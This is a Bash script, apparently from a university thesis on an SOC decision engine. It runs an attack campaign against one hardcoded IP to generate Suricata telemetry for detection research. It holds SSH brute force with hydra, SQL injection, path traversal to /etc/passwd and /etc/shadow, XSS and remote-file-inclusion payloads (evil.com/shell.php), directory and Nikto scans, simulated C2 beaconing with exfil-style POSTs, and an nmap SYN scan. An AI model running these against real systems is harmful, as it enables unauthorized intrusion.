#!/bin/bash
# ============================================================
# campana_ataques_soc.sh — Generación de telemetría de ataque
# Tesis UBO — Motor de Decisiones SOC
# Ejecutar desde Kali WSL2 contra .139 (Suricata captura todo)
# ============================================================
# Instalar herramientas si no están:
#   sudo apt install -y nmap hydra nikto gobuster sqlmap curl
# ============================================================

TARGET="200.54.12.139"
PROXY="http://$TARGET:8080"
SSH_PORT="2222"
LOG="/tmp/campana_$(date +%Y%m%d_%H%M).log"
USERS="/tmp/users_soc.txt"
WORDS="/usr/share/wordlists/rockyou.txt"

echo "root
admin
ubuntu
aiayala
user
test
www-data
mysql
postgres" > $USERS

log() { echo "[$(date +%H:%M:%S)] $1" | tee -a $LOG; }

log "========================================================"
log "Campaña de ataques SOC — $(date)"
log "Target: $TARGET | Proxy: $PROXY"
log "========================================================"

# ── BLOQUE 1: SSH Brute Force con conexión completada ─────────────────────────
# -t 1: 1 thread (más lento = más flujos con OUT_PKTS > 0)
# -w 2: esperar 2s respuesta del servidor (genera flows con duration > 0)
log "[1/5] SSH Brute Force — conexiones completadas"
timeout 180 hydra -L $USERS \
    -P $WORDS \
    -t 1 -w 2 -s $SSH_PORT \
    -o /tmp/hydra_result.txt \
    ssh://$TARGET 2>/dev/null &
HYDRA_PID=$!
log "  Hydra PID: $HYDRA_PID (corre 3 min en background)"
sleep 30

# ── BLOQUE 2: Ataques web — SQL Injection ─────────────────────────────────────
# Genera flujos HTTP completos con respuesta del servidor
log "[2/5] SQL Injection via proxy"
for payload in \
    "' OR '1'='1" \
    "'; DROP TABLE users;--" \
    "' UNION SELECT NULL,NULL,NULL--" \
    "admin'--" \
    "1' AND SLEEP(3)--" \
    "' OR 1=1#" \
    "1; SELECT * FROM information_schema.tables" \
    "' OR 'x'='x" \
    "../../../etc/passwd" \
    "../../../../etc/shadow"; do
    curl -s -o /dev/null -m 5 \
        "$PROXY/?id=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")" \
        -H "User-Agent: sqlmap/1.7.8" &
    sleep 0.5
done
wait
log "  SQL Injection completado"

# ── BLOQUE 3: Escaneo de directorios (Directory Brute Force) ──────────────────
log "[3/5] Directory Brute Force via proxy"
if command -v gobuster &>/dev/null; then
    gobuster dir \
        -u "$PROXY" \
        -w /usr/share/wordlists/dirb/common.txt \
        -t 5 \
        --timeout 3s \
        -q \
        -o /tmp/gobuster_result.txt 2>/dev/null &
    GOBUSTER_PID=$!
    sleep 60
    kill $GOBUSTER_PID 2>/dev/null
    log "  Gobuster completado"
else
    # Fallback con curl
    for path in admin login wp-admin phpMyAdmin .git config backup api v1 v2 \
                test dev staging uploads shell cmd exec passwd shadow etc; do
        curl -s -o /dev/null -m 3 "$PROXY/$path" \
            -H "User-Agent: DirBuster-1.0-RC1" &
        sleep 0.3
    done
    wait
    log "  Directory scan (curl) completado"
fi

# ── BLOQUE 4: Web Scanner — Nikto ─────────────────────────────────────────────
log "[4/5] Web Scanner Nikto"
if command -v nikto &>/dev/null; then
    nikto -h "$PROXY" -maxtime 120 -o /tmp/nikto_result.txt -Format txt -q 2>/dev/null &
    NIKTO_PID=$!
    sleep 120
    kill $NIKTO_PID 2>/dev/null
    log "  Nikto completado"
else
    # Fallback — payloads XSS y path traversal con curl
    for payload in \
        "<script>alert(1)</script>" \
        "../../etc/passwd" \
        "%00../../etc/passwd" \
        "?cmd=whoami" \
        "?exec=id" \
        "?file=/etc/passwd" \
        "?page=../../../etc/passwd" \
        "?url=http://evil.com/shell.php" \
        "?redirect=javascript:alert(1)" \
        "?search=<img src=x onerror=alert(1)>"; do
        curl -s -o /dev/null -m 5 \
            "$PROXY/$payload" \
            -H "User-Agent: Nikto/2.1.6" &
        sleep 0.4
    done
    wait
    log "  Web scan (fallback) completado"
fi

# ── BLOQUE 5: Simulación C2 Beaconing ─────────────────────────────────────────
# Simula implante malware enviando beacon cada 30 segundos
# Patrón: conexiones periódicas, mismo destino, pequeño payload
log "[5/5] C2 Beacon simulation (5 minutos)"
for i in $(seq 1 10); do
    TOKEN=$(cat /dev/urandom | tr -dc 'a-f0-9' | head -c 16)
    curl -s -o /dev/null -m 5 \
        "$PROXY/?check=$TOKEN&v=1.2&host=WIN-CORP-$(hostname)" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        -H "X-Session-Id: $TOKEN" &

    # Segunda conexión en el mismo intervalo (simulando data exfil)
    curl -s -o /dev/null -m 5 \
        -X POST "$PROXY/wp-admin/admin-ajax.php" \
        -d "action=heartbeat&data=$TOKEN" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" &

    log "  Beacon $i/10 enviado"
    sleep 30
done
wait $HYDRA_PID 2>/dev/null

# ── BLOQUE 6: Escaneo de puertos adicional ────────────────────────────────────
log "[6/6] Port scan final"
nmap -sS \
    -p 21,22,23,25,80,110,143,443,445,1433,3306,3389,5900,6379,8080,8443 \
    --min-rate 200 \
    -T3 \
    $TARGET \
    -oN /tmp/nmap_result.txt 2>/dev/null
log "  Port scan completado"

# ── Resumen ───────────────────────────────────────────────────────────────────
log "========================================================"
log "Campaña completada. Log: $LOG"
log "Tipos de ataque generados:"
log "  1. SSH brute force (conexiones completadas)"
log "  2. SQL Injection via proxy HTTP"
log "  3. Directory brute force"
log "  4. Web vulnerability scanner"
log "  5. C2 beacon simulation (10 beacons x 30s)"
log "  6. Port scan"
log "========================================================"
